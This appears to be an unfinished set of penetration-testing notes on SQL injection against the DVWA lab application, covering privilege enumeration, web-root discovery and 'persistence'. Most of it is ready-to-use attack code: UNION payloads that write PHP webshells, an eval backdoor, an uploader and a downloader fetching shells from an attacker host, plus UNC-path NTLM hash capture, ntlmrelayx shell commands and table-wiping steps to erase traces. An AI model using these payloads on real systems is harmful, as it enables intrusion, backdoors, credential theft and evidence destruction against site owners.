# 04 - Initial Foothold and Persistence

Search Tag(s): #sql-injection #union #initial-foothold #persistence #enumeration-and-discovery #webshell #dvwa

## 4.1 - Create User Account

TODO: Figure out using SQL queries to create a user account in the current database, and create a database user account for the DBMS server

### 4.1.1 - Current Database User Account

#### 4.1.1.1 - Conditions

1. The DB user must have **SELECT, INSERT, UPDATE, DELETE, DROP** privileges.

#### 4.1.1.2 - Enumerate Database User Privileges

```sql
' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'SELECT', '->', Select_priv, '\n', user, '->', 'INSERT', '->', Insert_priv, '\n', user, '->', 'UPDATE', '->', Update_priv, '\n', user, '->', 'DELETE', '->', Delete_priv, '\n', user, '->', 'DROP', '->', Drop_priv) FROM mysql.user#

' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'SELECT', '->', Select_priv, '\n', user, '->', 'INSERT', '->', Insert_priv, '\n', user, '->', 'UPDATE', '->', Update_priv, '\n', user, '->', 'DELETE', '->', Delete_priv, '\n', user, '->', 'DROP', '->', Drop_priv) FROM mysql.user WHERE user = 'dvwa'#

' UNION SELECT NULL, CONCAT(user, '->', 'SELECT', '->', Select_priv, '\n', user, '->', 'INSERT', '->', Insert_priv, '\n', user, '->', 'UPDATE', '->', Update_priv, '\n', user, '->', 'DELETE', '->', Delete_priv, '\n', user, '->', 'DROP', '->', Drop_priv) FROM mysql.user WHERE Select_priv = 'Y' OR Insert_priv = 'Y' OR Update_priv = 'Y' OR Delete_priv = 'Y' OR Drop_priv = 'Y'#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE GRANTEE LIKE "'dvwa'%"#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SELECT' OR PRIVILEGE_TYPE LIKE 'INSERT' OR PRIVILEGE_TYPE LIKE 'UPDATE' OR PRIVILEGE_TYPE LIKE 'DELETE' OR PRIVILEGE_TYPE LIKE 'DROP' AND GRANTEE LIKE "'dvwa'%"#
```

#### 4.1.1.3 - INSERT values

`' INSERT INTO dvwa.users values()#`

#### 4.1.1.4 - UPDATE values

`' UPDATE INTO dvwa.users values()#`

#### 4.1.1.5 - Clean Traces

- DELETE Query after INSERTing

- UPDATE Query

TODO: Demonstrate it to wipe traces in the DB when you insert values

```sql
SELECT * FROM <database_name>.<table_name>;

' UNION SELECT * NULL FROM <database_name>.<table_name>#
```

Empty the table with the DELETE Statement

```sql
DELETE FROM <database_name>.<table_name>
```

Empty the table with the TRUNCATE Statement

```sql
TRUNCATE TABLE <database_name>.<table_name>;
```

```sql
DROP TABLE <database_name>.<table_name>;
```

### 4.1.2 - DBMS User Account

#### 4.1.2.1 - Conditions

1. The DB user must have **SELECT, INSERT, CREATE, ALTER, UPDATE, DELETE** privileges.

## 4.2 - Webshell

### 4.2.1 - Conditions

These are the required conditions to insert a webshell.

1. The DB user must have **FILE** and **SELECT** privileges.
2. Find the web root directory using the enumeration methods.
3. The web root directory must have write permissions.

### 4.2.2 - Enumerate Database User Privileges

```sql
' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv) FROM mysql.user#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#
```

### 4.2.3 - Web Root Enumeration

Note: This step is necessary to find a destination to write a webshell.

#### 4.2.3.1 - Linux

- Using SQL Query statements especially when you execute the `LOAD_FILE()` function. It will disclose the PHP warning messages to find the absolute path of the web root directory. Keep an eye out them.

- Write a file in the common world writable directories. These two are the best candidates: `/tmp/` and `/dev/shm/`

```sql
' UNION SELECT 'test', NULL INTO OUTFILE '/tmp/file.txt'#

' UNION SELECT 1, LOAD_FILE('/tmp/file.txt')#

' UNION SELECT 'test', NULL INTO OUTFILE '/dev/shm/file.txt'#

' UNION SELECT 1, LOAD_FILE('/dev/shm/file.txt')#
```

- Hex encoded

```sql
' UNION SELECT 0x74657374, NULL INTO OUTFILE '/dev/shm/file.txt'#

' UNION SELECT 1, LOAD_FILE('/dev/shm/file.txt')#
```

`<insert_screenshot from any of the SQLi commands for directory enumeration>`

`<insert screenshot any of the OS enumeration from above>`

#### 4.2.3.2 - Windows

- Using SQL Query statements will disclose the PHP warning messages to find the absolute path of the web root directory.

- When you execute the `LOAD_FILE()` function. Keep an eye out the php warning syntax messages. It'll provide you the absolute path to write php files.

```sql
' UNION SELECT 'test', NULL INTO OUTFILE 'C:\\Windows\\Temp\\file.txt'#

' UNION SELECT NULL, LOAD_FILE('C:\\Windows\\Temp\\file.txt')#
```

- Hex encoded

```sql
' UNION SELECT 0x74657374, NULL INTO OUTFILE 'C:\\Windows\\Temp\\file.txt'#

' UNION SELECT 1, LOAD_FILE('C:\\Windows\\Temp\\file.txt')#
```

#### 4.2.2.3 - General

- We'll be using the SQL queries to enumerate file destination that may give us the directory web root path to write the webshell.

TODO: Demonstrate from the enumeration phase to find the web root directory

WHERE avatar LIKE '%upload%'

WHERE avatar LIKE  '%.jpeg'

WHERE avatar LIKE  '%.pdf'

WHERE avatar LIKE  '%.txt'

`<insert_screenshot from any of the SQLi commands for directory enumeration>`

- Spidering the URL with the use of `katana` to enumerate directories.

TODO: paste terminal commands and output

- Bruteforce the directories in the URL with tools such as, `gobuster`

TODO: paste terminal commands and output

### 4.2.4 - Exploit

TODO: Provide a way to GRANT the current DB user account for FILE Privilege

#### 4.2.4.1 - Exploit via OUTFILE

##### 4.2.4.1.1 - Simple Webshell

Note: There are a few things you need to know about these error messages.

1. MySQL can't find the source. To solve this error, you need to provide the absolute path to source.

```sql
' UNION SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>', NULL INTO OUTFILE '/var/html/shell.php'#
```

Here's the error message.

```
Can't create/write to file '/var/html/shell.php' (Errcode: 2 "No such file or directory")
```

2. Ensure the directory has write permissions.

```sql
' UNION SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>', NULL INTO OUTFILE '/var/www/shell.php'#
```

Here's the error message.

```
Can't create/write to file '/var/www/shell.php' (Errcode: 13 "Permission denied")
```

- Save the webshell with an absolute path

```sql
' UNION SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>', NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
```

`<insert_screenshosts>`

- You can of course encode it with hexadecimal

```bash
$ echo -n "<?php system(\$_GET['cmd']); ?>" | hexdump -v -e '/1 "%02x"' | sed 's/^/0x/'
0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e
```

```sql
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
```

- Write a webshell via `LINES TERMINATED BY` SQL query.

```sql
' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php' LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e#
```

- Write a webshell via `LINES STARTING BY` SQL query.

```sql
' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php' LINES STARTING BY 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e#
```

- Write a webshell via `FIELDS TERMINATED BY` SQL query.

```sql
' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php' FIELDS TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e#
```

- Write a webshell via `COLUMNS TERMINATED BY` SQL query.

```sql
' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php' COLUMNS TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e#
```

##### 4.2.5.1.2 - Uploader

You can use a file uploader that allows you to upload anything such as custom [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Callback Shells/Webshells/Webshells|webshells]].

`$ cat uploader.php`

---

```php
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Upload</title>
    </head>
    <body>
        <h2>File Upload</h2>
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload" name="submit">
        </form>

        <?php
        if (isset($_POST['submit'])) {
            if (!empty($_FILES['fileToUpload']['name'])) {
                $targetDir = './'; // Upload to the same directory as the PHP script
                $targetFile = $targetDir . basename($_FILES['fileToUpload']['name']);

                if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
                    echo "File uploaded successfully.";
                } else {
                    echo "Sorry, there was an error uploading your file.";
                }
            } else {
                echo "Please choose a file to upload.";
            }
        }
        ?>
    </body>
</html>
```

Here's a one PHP liner.

```php
<?php if(isset($_POST['submit'])){$t='./';$f=$t.basename($_FILES['fileToUpload']['name']);if(move_uploaded_file($_FILES['fileToUpload']['tmp_name'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?> <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>File Upload</title></head><body><h2>File Upload</h2><form action="<?=$_SERVER['PHP_SELF']?>" method="POST" enctype="multipart/form-data"><input type="file" name="fileToUpload" id="fileToUpload"><input type="submit" value="Upload" name="submit"></form></body></html>
```

SQL Query for reference.

```sql
SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>' INTO OUTFILE '/path/to/uploader.php'
```

Convert it to SQLi injection exploit with **UNION SELECT**.

```sql
' UNION SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>', NULL INTO OUTFILE '/var/www/html/dvwa/uploader.php'#
```

- Base64 encoded

```sql
' UNION SELECT FROM_BASE64("<base64_encoded>"), NULL INTO OUTFILE '/var/www/html/dvwa/file.php'#
```

```sql
$ echo "<?php \$cmd=\$_GET[\"cmd\"];system(\$cmd);?>" | base64
PD9waHAgJGNtZD0kX0dFVFsiY21kIl07c3lzdGVtKCRjbWQpOz8+Cg==

' UNION SELECT FROM_BASE64("PD9waHAgJGNtZD0kX0dFVFsiY21kIl07c3lzdGVtKCRjbWQpOz8+Cg=="), NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
```

##### 4.2.5.1.3 - Downloader

SQL Query for reference.

```sql
SELECT '<?php fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/html/downloader.php'
```

Convert it to SQL injection exploit with **UNION SELECT**.

```sql
' UNION SELECT '<?php fwrite(fopen($_GET[file], \'w\'), file_get_contents($_GET[url])); ?>' INTO OUTFILE '/var/www/html/downloader.php'
```

Usage example to download an external webshell via attacker URL.

```
http://dvwa.local/dvwa/downloader.php?file=error.php&url=http[s]://<attacker_IP>/shell.php
```

##### 4.2.5.1.4 - Evaluate PHP Code

```php
<?php eval($_GET[evaluate]); ?>
```

SQL Query for reference.

```sql
SELECT '<?php eval($_GET[evaluate]); ?>', NULL INTO OUTFILE '/var/www/html/dvwa/eval_php.php'
```

Convert it to SQL injection exploit with **UNION SELECT**.

```sql
' UNION SELECT '<?php eval($_GET[evaluate]); ?>', NULL INTO OUTFILE '/var/www/html/dvwa/eval_php.php'#
```

An example usage to enumerate PHP backend server side.

```
http://dvwa.local/dvwa/eval_php.php?evaluate=phpinfo()
```

`<insert screenshots>`

- Base64 encoded

```
http://dvwa.local/dvwa/eval_php.php?evaluate=if(file_put_contents('webshell.php', base64_decode(<base64_encoded>))){ echo 1;} else {echo 2;}
```

##### 4.2.5.1.4 - NTLM Hashes (Out-of-band) via Authenticated SMB Relay

TODO: Check the links in the references to check other ways to exploit UNC paths.

- Run [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes.

```sql
' UNION SELECT NULL, LOAD_FILE('\\\\<attacker_IP>\\snare.txt')#
```

- Responder

```
$ sudo responder -I <interface> -A
```

- Metasploit Framework

```
smb_relay
```

##### 4.2.5.1.5 - Authenticated SMB Relay Callback Shell (Out-of-band)

- Execute commands

`$ sudo impacket-ntlmrelayx -t smb://dvwa.local -smb2support -c <commands>`

- Retrieve a callback shell

`$ sudo impacket-ntlmrelayx -t smb://dvwa.local -smb2support -e shell.exe`

#### 4.2.5.2 - Exploit via DUMPFILE

### 4.1.2 - Enumerate Database User Privileges

TODO: Include Create_priv

```sql
' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'SELECT', '->', Select_priv, '\n', user, '->', 'INSERT', '->', Insert_priv, '\n', user, '->', 'UPDATE', '->', Update_priv, '\n', user, '->', 'DELETE', '->', Delete_priv, '\n', user, '->', 'DROP', '->', Drop_priv) FROM mysql.user#

' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'SELECT', '->', Select_priv, '\n', user, '->', 'INSERT', '->', Insert_priv, '\n', user, '->', 'UPDATE', '->', Update_priv, '\n', user, '->', 'DELETE', '->', Delete_priv, '\n', user, '->', 'DROP', '->', Drop_priv) FROM mysql.user WHERE user = 'dvwa'#

' UNION SELECT NULL, CONCAT(user, '->', 'SELECT', '->', Select_priv, '\n', user, '->', 'INSERT', '->', Insert_priv, '\n', user, '->', 'UPDATE', '->', Update_priv, '\n', user, '->', 'DELETE', '->', Delete_priv, '\n', user, '->', 'DROP', '->', Drop_priv) FROM mysql.user WHERE Select_priv = 'Y' OR Insert_priv = 'Y' OR Update_priv = 'Y' OR Delete_priv = 'Y' OR Drop_priv = 'Y'#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE GRANTEE LIKE "'dvwa'%"#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SELECT' OR PRIVILEGE_TYPE LIKE 'INSERT' OR PRIVILEGE_TYPE LIKE 'UPDATE' OR PRIVILEGE_TYPE LIKE 'DELETE' OR PRIVILEGE_TYPE LIKE 'DROP' AND GRANTEE LIKE "'dvwa'%"#
```

##### 4.2.5.2.1 - Simple Webshell

TODO: Replicate the methods from this video https://www.youtube.com/watch?v=FjgKtBAiLKQ

```sql
CREATE TABLE `dvwa`.`user_input`(
`column_1` VARCHAR(1000) NOT NULL
) ENGINE = MYISAM;

INSERT INTO user_input values('<?php $cmd=$_GET["cmd"];system($cmd);?>')

SELECT * INTO DUMPFILE '/var/www/html/dvwa/shell.php' FROM user_input;
```

##### 4.2.5.2.2 - Uploader

```sql
CREATE TABLE `dvwa`.`user_upload`(
`column_1` VARCHAR(1000) NOT NULL
) ENGINE = MYISAM;

INSERT INTO user_upload values('<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Upload</title>
    </head>
    <body>
        <h2>File Upload</h2>
        <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="POST" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload" name="submit">
        </form>

        <?php
        if (isset($_POST["submit"])) {
            if (!empty($_FILES["fileToUpload"]["name"])) {
                $targetDir = "./"; // Upload to the same directory as the PHP script
                $targetFile = $targetDir . basename($_FILES["fileToUpload"]["name"]);

                if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
                    echo "File uploaded successfully.";
                } else {
                    echo "Sorry, there was an error uploading your file.";
                }
            } else {
                echo "Please choose a file to upload.";
            }
        }
        ?>
    </body>
</html>')

SELECT * INTO DUMPFILE '/var/www/html/dvwa/uploader.php' FROM user_upload;
```

---
## References

- [MySQL Documentation: Privileges](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html)

- [Hacking Articles: Dumping Database using Outfile](https://www.hackingarticles.in/dumping-database-using-outfile)

- [InfoSec Institute: Creating backdoors using SQL injection](https://resources.infosecinstitute.com/topics/hacking/backdoor-sql-injection/)

- [Hacking Articles: Cross-Site Scripting Exploitation](https://www.hackingarticles.in/cross-site-scripting-exploitation/)

- [S12 - H4CK: SQL Injection Medium Writeup](https://systemweakness.com/sql-injection-fe6809dcca69)

- [Acunetix: SQLi Part 3 - The anatomy of an SQL Injection attack](https://www.acunetix.com/blog/articles/sqli-part-3-the-anatomy-of-an-sql-injection-attack/)

- [Exploiting SQL Injection Example](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/)

- [PayloadsAllTheThings SQL Injection: MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

- [Executing OS Commands Through MySQL](https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql)

- [Blackhat Europe: Advanced SQL injection to operating system full control](https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-slides.pdf)

- [AppSecEu: Advanced SQL injection to operating system full control](https://owasp.org/www-pdf-archive/AppsecEU09-Damele-A-G-Advanced-SQL-injection-slides.pdf)

- [MySQL Out-of-Band Hacking](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)